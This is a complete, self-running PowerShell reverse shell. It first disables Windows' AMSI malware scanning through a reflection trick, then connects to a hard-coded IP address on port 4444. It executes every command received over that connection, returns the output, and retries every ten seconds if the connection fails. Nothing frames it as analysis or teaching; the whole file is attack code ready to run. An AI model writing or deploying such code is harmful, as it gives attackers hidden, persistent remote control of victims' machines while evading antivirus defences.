
$IP = "10.211.55.5"
$PT = 4444


$w = 'System.Management.Automation.AmsiUtils'
$f = 'amsiInitFailed'
[Ref].Assembly.GetType($w).GetField($f, 'NonPublic,Static').SetValue($null, $true)


Function Invoke-StealthConnect {
While($true) {
Try {
           
            $c = [System.Activator]::CreateInstance([System.Net.Sockets.TcpClient], $IP, $PT)
            $s = $c.GetStream()
            $b = New-Object byte[] 8192
While($c.Connected) {
            
                $r = $s.Read($b, 0, $b.Length)
If($r -gt 0) {
                    $d = [System.Text.Encoding]::ASCII.GetString($b, 0, $r)
                    
               
                    $out = &([scriptblock]::Create($d)) 2>&1 | Out-String
                    $res = [System.Text.Encoding]::ASCII.GetBytes($out + "PS> ")
                    $s.Write($res, 0, $res.Length)
                    $s.Flush()
                }
            }
        } catch {
           
            Start-Sleep -Seconds 10
        }
    }
}

# --- EXECUTION ---
Invoke-StealthConnect
